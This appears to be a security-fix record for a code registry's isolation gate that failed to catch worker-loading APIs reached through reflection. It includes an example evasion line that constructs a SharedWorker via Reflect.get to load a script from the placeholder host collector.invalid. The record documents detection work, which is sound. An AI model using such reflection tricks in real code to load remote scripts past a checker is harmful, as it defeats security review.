title: Reflective worker API access bypassed the registry isolation gate

examples: const get = Reflect.get; const makeWorker = get(window, 'SharedWorker'); new makeWorker('https://collector.invalid/shared.js');
reproduction.beforeFix: A reflected Worker constructor lookup followed by Reflect.construct returned pass. The regression also covers related reflected service-worker and importScripts forms, including an alias of Reflect.apply.
reproduction.afterFix: Reflected property lookup, descriptor-value lookup, Reflect.apply, and Reflect.construct paths are resolved and blocked when they expose worker-loading APIs.

rootCause: Worker checks followed direct and variable aliases but did not resolve capabilities obtained through Reflect.get/Object.getOwnPropertyDescriptor or invoked through Reflect.apply/Reflect.construct.
remediation: Resolve statically named reflected property accesses and aliases to worker constructors, service-worker registration, and importScripts; inspect reflected calls without executing submitted source.

validation.redBeforeFix: pnpm exec vitest run packages/registry-gate/src/__tests__/registry-gate.test.ts -t "reflected worker and service-worker code loading"
validation.redBeforeFixResult: failed as expected: the reflected Worker constructor lookup returned pass
validation.targetedAfterFix: pnpm exec vitest run packages/registry-gate/src/__tests__/registry-gate.test.ts -t "reflected worker and service-worker code loading"
validation.releaseAudit: 16/16 behavioral gates, production builds, bundle budgets, provenance/security audits, and dependency audit passed
